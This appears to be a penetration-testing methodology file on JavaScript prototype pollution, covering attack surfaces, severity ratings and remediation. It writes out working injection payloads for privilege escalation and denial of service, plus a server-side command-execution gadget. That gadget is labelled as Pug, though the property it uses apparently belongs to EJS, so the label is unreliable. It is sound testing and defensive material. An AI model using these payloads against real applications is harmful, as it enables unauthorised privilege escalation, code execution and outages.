---
name: prototype_pollution
description: Prototype pollution testing covering client-side and server-side JavaScript object prototype manipulation
---

# Prototype Pollution

Prototype pollution allows attackers to inject properties into JavaScript's `Object.prototype`, affecting all objects in the application. This can lead to XSS, RCE, authentication bypass, or denial of service.

## Attack Surface

**Client-Side**
- URL query parameters parsed into objects (e.g., `?__proto__[admin]=true`)
- Hash fragment, JSON merge operations
- Vulnerable libraries: lodash, jQuery (old), Hoek, merge/deepmerge, qs

**Server-Side (Node.js)**
- JSON body deserialization
- Deep merge / extend utilities
- Template engines evaluating polluted properties

## Testing Methodology

### Step 1 – Client-Side Detection
In browser console, inject via URL:
```
https://target.com/?__proto__[polluted]=yes
```
Then check: `({}).polluted === "yes"` — if `true`, the app is vulnerable.

### Step 2 – JSON Body Injection
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
Send in POST body; check if subsequent requests gain elevated privileges.

### Step 3 – Gadget Hunting (Server-Side RCE)
Common gadgets in Node.js:
- `child_process.spawn` options polluted with `shell: true`
- Template engines: Handlebars, Pug, EJS checking polluted properties
- `JSON.parse` / `Object.assign` sinks

```json
{"__proto__": {"outputFunctionName": "_x; process.mainModule.require('child_process').execSync('id > /tmp/pwned'); //"}}
```
(Pug template RCE gadget)

### Step 4 – Property Names to Try
- `__proto__`
- `constructor.prototype`
- `__proto__.constructor.prototype`

### Step 5 – DoS via Pollution
```json
{"__proto__": {"toString": null}}
```
Overriding built-in methods can crash Node.js processes.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Server-side RCE via gadget chain | Critical |
| Authentication/authorization bypass | High |
| Client-side XSS via polluted sink | High |
| Denial of service | Medium |

## Remediation

- Use `Object.create(null)` for dictionaries that hold user-supplied keys
- Validate/sanitize keys: reject `__proto__`, `constructor`, `prototype`
- Use `Map` instead of plain objects for user-controlled key-value pairs
- Upgrade vulnerable libraries (lodash ≥ 4.17.21, qs ≥ 6.10.3)
- Set `--frozen-intrinsics` in Node.js (experimental)
